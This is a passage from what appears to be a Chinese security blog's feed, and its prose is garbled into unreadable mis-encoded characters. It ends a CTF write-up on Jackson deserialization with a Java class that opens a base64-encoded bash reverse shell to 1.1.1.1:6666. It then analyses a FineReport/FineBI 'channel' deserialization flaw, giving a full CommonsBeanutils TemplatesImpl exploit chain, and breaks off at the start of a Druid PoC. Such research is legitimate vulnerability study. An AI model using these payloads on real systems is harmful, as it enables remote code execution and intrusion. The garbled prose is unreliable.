class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> field.get(obj);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>calcÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÁîüÊàêcalcÂ∫èÂàóÂåñÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ser</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">calc</span> <span class="variable">calc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">calc</span>();</span><br><span class="line">        <span class="type">byte</span>[] serialize = serialize(calc);</span><br><span class="line">        System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(serialize)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ÊµÅÁ®ã"><a href="#ÊµÅÁ®ã" class="headerlink" title="ÊµÅÁ®ã"></a>ÊµÅÁ®ã</h2><p>ËøôÈáåÊòØÊàëÊú¨Âú∞Â§çÁé∞ÁöÑÔºåÊâÄ‰ª•ÂÖ®ÈÉ®Âú®Êú¨Âú∞ÔºåÂÖàÊääcalcÈÇ£‰∏™Á±ªÁºñËØëÊàêÂ≠óËäÇÁ†Å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac calc.java</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂºÄÂêØÁõëÂê¨ÔºåÂÖàÂèëÈÄÅÁ¨¨‰∏Ä‰∏™payloadÊääËøúÁ®ãÂú∞ÂùÄÊâìËøõÂéª</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147336.png" alt="image.png"></p><p>ÁÑ∂ÂêéÂèëÈÄÅcalcÁöÑÂ∫èÂàóÂåñÊï∞ÊçÆ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311147197.png" alt="image.png"></p><p>Á®çÁ≠â‰∏Ä‰∏ãÊî∂Âà∞shell</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408311212197.png" alt="image-20240831121235908"></p><p>‰∏çÁü•ÈÅì‰ªÄ‰πàÂéüÂõ†ÔºåÊàëÊú¨Âú∞‰πüÊòØÊâì‰∫ÜÂæàÂ§öÈÅçÊâçÊàêÂäüÔºåÂèØËÉΩÊòØJacksonÁöÑ‰∏çÁ®≥ÂÆöÊÄß ÔºåÁÑ∂ÂêéÊàë‰∏ÄÂºÄÂßãËøòÊúâ‰∏Ä‰∏™ÁñëÊÉëÁöÑÁÇπÔºåÊàë‰ª¨Runtime‰∏çÊòØË¢´ban‰∫Ü‰∏∫Âï•ÊúÄÂêéËøòÂèØ‰ª•Áî®ÂÆÉÊù•ÊâßË°åÂëΩ‰ª§ÔºüÂÖ∂ÂÆûËøôÈáåËôΩÁÑ∂RuntimeË¢´Âäû‰∫ÜÔºå‰ΩÜÊòØÊàë‰ª¨ÊâìËøõÂéªÁöÑÊòØcalcÁ±ªÔºåÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÂè™‰ºöÂåπÈÖçÂà∞Ëøô‰∏™Á±ªÔºåËÄå‰∏ÄÂºÄÂßãÁöÑÈìæÂ≠êpayloadÈáåÈù¢‰πüÊ†πÊú¨Ê≤°Áî®RuntimeÁ±ªÔºåÊâÄ‰ª•ËøôÈáåÂ∞±ÂèØ‰ª•Áî®‰∫Ü</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Â∏ÜËΩØ FineReport/FineBI channelÂèçÂ∫èÂàóÂåñÂàÜÊûê</title>
      <link href="/2024/08/%E5%B8%86%E8%BD%AF-FineReport-FineBI-channel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
      <url>/2024/08/%E5%B8%86%E8%BD%AF-FineReport-FineBI-channel%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>ÈöèÊâãËÆ∞ÂΩï‰∏Ä‰∏ã</p><h2 id="Ëß¶ÂèëÁÇπÂàÜÊûê"><a href="#Ëß¶ÂèëÁÇπÂàÜÊûê" class="headerlink" title="Ëß¶ÂèëÁÇπÂàÜÊûê"></a>Ëß¶ÂèëÁÇπÂàÜÊûê</h2><p>ÊàëËøôÈáåÁöÑ‰ª£Á†ÅÊòØFineBI5.1.0ÁöÑÔºåÂú®Ëøô‰∏™ÁâàÊú¨Ë∑ØÁî±ÊòØÈÄöËøáÊ≥®Ëß£ÂΩ¢ÂºèÂÆûÁé∞ÁöÑÔºåÂõ†‰∏∫ÊòØÂ§çÁé∞ÊâÄ‰ª•Áõ¥Êé•Êù•Âà∞ÊºèÊ¥ûÊé•Âè£</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041104230.png" alt="Untitled"></p><p>ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™channelÊé•Âè£Â∞±ÊòØÊàë‰ª¨ÊºèÊ¥ûÁÇπ‰∫ÜÔºåÂú®Ëøô‰∏™Êñá‰ª∂ÁöÑÊé•Âè£ÈÉΩÊòØÂú®<code>/remote/design</code> Ë∑ØÁî±‰∏ã</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041104961.png" alt="Untitled"></p><p>‰ΩÜÊòØÂÆûÈôÖËÆøÈóÆÈúÄË¶ÅÂä†‰∏äÂåÖÂêç&#x2F;decision&#x2F;Ëá≥‰∫é&#x2F;webroot&#x2F;Â∫îËØ•Â∞±ÊòØÊï¥‰∏™È°πÁõÆÁöÑÁõÆÂΩïÂêç‰∫ÜÔºåÂÖ∑‰ΩìÁöÑË∑ØÁî±ÂÆö‰πâÊ≤°ÊâæÂà∞ÔºåÂè™ËÉΩËøôÊ†∑ÁåúÊµã‰∫ÜÔºåÂÖ≥‰∫éË∑ØÁî±ÂàÜÊûêËøòÊòØÂæóÂÜçÁªÉÁªÉ„ÄÇ„ÄÇ„ÄÇ</p><p>ÂèØ‰ª•ÁúãÂà∞Âú®channelÊé•Âè£‰∏ãËé∑Âèñ‰∫ÜrequestËØ∑Ê±ÇÔºåÂ∞ÜÂÖ∂ËΩ¨Âåñ‰∏∫ËæìÂÖ•ÊµÅÔºåÁÑ∂ÂêéÂÜôËøõËæìÂá∫ÊµÅÔºàÊÑüËßâJavaÁöÑIOÊµÅ‰πüÂæóÂ•ΩÂ•ΩÂ≠¶Â≠¶ÔºåÊï¥ÁöÑÊàë‰∏ÄÊÑ£‰∏ÄÊÑ£ÁöÑÔºâÔºåËøáÁ®ã‰∏≠Ë∞ÉÁî®‰∫Ü<br><code>WorkContext.handleMessage()</code>  **ÂØπËØ∑Ê±ÇËøõË°å‰∫ÜÂ§ÑÁêÜÔºåÁõ¥Êé•Ë∑üËøõËøô‰∏™ÊñπÊ≥ï</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041104865.png" alt="Untitled"></p><p>ÁÑ∂Âêé<code>*messageListener</code>* ÊòØ<code>WorkspaceMessageHandler</code> ÁöÑÂØπË±°Ëá™ÁÑ∂‰πüÂ∞±Ë∑≥ËΩ¨Âà∞Ëøô‰∏™Êé•Âè£‰∫ÜÔºåËøôÈáåÂÆûÁé∞‰∫ÜËøô‰∏™Êé•Âè£ÁöÑÁ±ªÂ∫îËØ•Âè™Êúâ‰∏Ä‰∏™ÔºåÊàëÁÇπÂáªË∑üËøõÁõ¥Êé•Â∞±Ë∑≥ËΩ¨‰∫Ü</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105156.png" alt="Untitled"></p><p>ÁúãÂà∞‰∫ÜÁ±ª‰ººÂèçÂ∫èÂàóÂåñÁöÑÊñπÊ≥ï<code>deserializeInvocation</code> Ë∑üËøõ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105034.png" alt="Untitled"></p><p>Ê≠§Êó∂Â∞±ÂæóÊ≥®ÊÑè‰∫ÜÔºåÈô§‰∫ÜÊàë‰ª¨ÂèØÊéßÁöÑÂèÇÊï∞ÊµÅÂà∞‰∫ÜËøôÈáåÔºåÂêéÈù¢ËøòÊâßË°å‰∫Ü‰∏Ä‰∏™<code>GZipSerializerWrapper.wrap(InvocationSerializer.getDefault())</code> ÂØπ‰∫éËøô‰∏™<code>wrap</code> ‰º†ÂÖ•ÁöÑÊòØ<code>InvocationSerializer</code> Á±ªÁöÑÂÆû‰æãÔºåË∑üËøõËøô‰∏™<code>wrap</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105946.png" alt="Untitled"></p><p>Ë∑üËøõËøô‰∏™Á±ª</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105997.png" alt="Untitled"></p><p>Êù•Âà∞ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™<code>this.serializer</code> Âç≥<code>InvocationSerializer</code> Á±ªÁöÑÂÆû‰æãÔºåËøô‰∏™ÂàÜÊûêÂêéÈù¢‰ºöÊúâÁî®ÔºåÂõûÂà∞‰πãÂâç</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Invocation <span class="title function_">deserializeInvocation</span><span class="params">(<span class="type">byte</span>[] paramArrayOfbyte, FineResult paramFineResult)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> SerializerHelper.&lt;Invocation&gt;deserialize(paramArrayOfbyte, GZipSerializerWrapper.wrap(InvocationSerializer.getDefault()));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        paramFineResult.setResult(<span class="literal">null</span>);</span><br><span class="line">        paramFineResult.setException(exception);</span><br><span class="line">        <span class="keyword">throw</span> exception;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁªßÁª≠Ë∑üËøõËøô‰∏™<code>deserialize</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105305.png" alt="Untitled"></p><p>ÂèØ‰ª•ÁúãÂà∞ÂèØÊéßÂèÇÊï∞ÊµÅÂà∞‰∫ÜÂèçÂ∫èÂàóÂåñËøôÈáåÔºåÂèçÂ∫èÂàóÂåñÂô®<code>paramSerializer</code> Âç≥Êàë‰ª¨‰∏äÈù¢ÂàÜÊûêÁöÑ<br><code>GZipSerializerWrapper</code> Á±ªÔºåË∑üËøõ<code>deserialize</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105193.png" alt="Untitled"></p><p>Ê≠§Êó∂ÂæàÊòæÁÑ∂Êàë‰ª¨Â∫îËØ•ÈÄâÁ¨¨‰∫å‰∏™</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041105384.png" alt="Untitled"></p><p>ËÄåËøôÈáåÁöÑ<code>this.serializer</code> Âç≥Êàë‰ª¨‰∏äÈù¢ÂàÜÊûêÁöÑ<code>InvocationSerializer</code> Á±ªÁöÑÂÆû‰æãÔºåÊâÄ‰ª•Êàë‰ª¨ÂÜçÊ¨°Ë∑üËøõ<br><code>deserialize</code> </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106256.png" alt="Untitled"></p><p>Ê≠§Êó∂Â∞±ÈÄâÊã©Á¨¨Âõõ‰∏™‰∫ÜÔºåÂÖ∂ÂÆûÊúâË∞ÉËØïÁöÑËØùÂÆåÂÖ®‰∏çÁî®Ëøô‰πàÂàÜÊûêÔºåÁõ¥Êé•Ë∑üÁùÄË∑≥Â∞±Ë°å‰∫ÜÔºå‰ΩÜÊòØÊàëË∞ÉËØïÁéØÂ¢ÉÊ≤°ÂºÑÂ•Ω„ÄÇ„ÄÇ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106483.png" alt="Untitled"></p><p>Âá∫Áé∞‰∫Ü‰∏§‰∏™readObejctÊñπÊ≥ïÔºåÂç≥Êàë‰ª¨ÂèçÂ∫èÂàóÂåñÁöÑÁªàÁÇπ‰∫Ü</p><h2 id="ÈìæÂ≠êÊûÑÈÄ†"><a href="#ÈìæÂ≠êÊûÑÈÄ†" class="headerlink" title="ÈìæÂ≠êÊûÑÈÄ†"></a>ÈìæÂ≠êÊûÑÈÄ†</h2><h3 id="CBÈìæ"><a href="#CBÈìæ" class="headerlink" title="CBÈìæ"></a>CBÈìæ</h3><p>ÊûÑÈÄ†ÈìæÂ≠êÁÆÄÂçïÁöÑÂ∞±ÊòØÂÖàÊâæÂ≠ò‰∏çÂ≠òÂú®ÊúâÂéÜÂè≤ÊºèÊ¥ûÁöÑ‰æùËµñÔºåÈÇ£Ê†∑ÊØîËæÉÂ•ΩÊâæËß¶ÂèëÁÇπÔºå‰πç‰∏ÄÁúãÊ≤°ÁúãÂà∞ÁÜüÊÇâÁöÑ‰æùËµñÔºåÂÖ∂ÂÆûÂ∏ÜËΩØÈÉΩÂÜÖÁΩÆ‰∫ÜÔºåÂü∫Êú¨‰∏äÂú®‰∏ãÈù¢Ëøô‰∏™jarÂåÖ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106937.png" alt="Untitled"></p><p>ÊòéÊòæÁöÑCB‰æùËµñÔºå‰ΩÜÊòØ‰ºº‰πéÂπ∂‰∏çÁü•ÈÅìÁâàÊú¨ÔºåÁõ¥Êé•Áî®Ê∫êÁ†ÅÁöÑjarÂåÖÂç≥ÂèØ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.jcraft.jzlib.GZIPInputStream;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Êó†CC‰æùËµñ</span></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>, beanComparator);</span><br><span class="line">        queue.add(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;b&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Serialize(queue);</span></span><br><span class="line">        Unserialize(<span class="string">&quot;H4sIAAAAAAAAAK1Uz2/cRBh9s3Z2ky.....&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// Â∫èÂàóÂåñ</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ÂåÖË£ÖÊàêZIP</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">baos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPOutputStream</span> <span class="variable">gos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos3);</span><br><span class="line">        gos3.write(baos.toByteArray());</span><br><span class="line">        gos3.finish();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos3.toByteArray());</span><br><span class="line">        System.out.println(base64str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">(String base64str)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64str));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(bais);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(gis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÈÄöËøáyakitÂèëÂåÖÊØîËæÉÊñπ‰æøÔºåÂõ†‰∏∫Ê∫êÁ†ÅÂπ∂Ê≤°ÊúâËøõË°åbase64Ëß£Á†ÅÔºåÊâÄ‰ª•Áî®yakitÁöÑfuzztag</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106690.png" alt="Untitled"></p><p>ÂºπÂá∫ËÆ°ÁÆóÂô®</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202408041106515.png" alt="Untitled"></p><p>Âú®5.1.18Ëøô‰∏™payloadÂ§±ÊïàÔºåÂéüÊú¨ÁöÑ<code>InputStream</code>ÂØπË±°Â∑≤Ë¢´<code>JDKSerializer.CustomObjectInputStream</code> Â¶ÇÊûúÁ±ªÂú®ÈªëÂêçÂçïÂàô‰∏çËøõË°åÂèçÂ∫èÂàóÂåñ</p><h3 id="‰∏çÁü•ÈÅìÂè´‰ªÄ‰πàÈìæ"><a href="#‰∏çÁü•ÈÅìÂè´‰ªÄ‰πàÈìæ" class="headerlink" title="‰∏çÁü•ÈÅìÂè´‰ªÄ‰πàÈìæ"></a>‰∏çÁü•ÈÅìÂè´‰ªÄ‰πàÈìæ</h3><p>ËøôÊù°ÈìæÂè™ÂÖ¨ÂºÄ‰∫Ü‰∏ÄÂ∞è‰ºöÊñáÁ´†Â∞±Ë¢´‰∏ãÊû∂‰∫ÜÔºå‰∏ãÈù¢Ëøô‰∏™pocÊòØË¶ÅÂ∏¶h2Â∫ìÁöÑÔºåÈªòËÆ§‰∏çÂ≠òÂú®ÔºåÈªòËÆ§Â≠òÂú®ÁöÑ‰∏∫hsqldb</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> 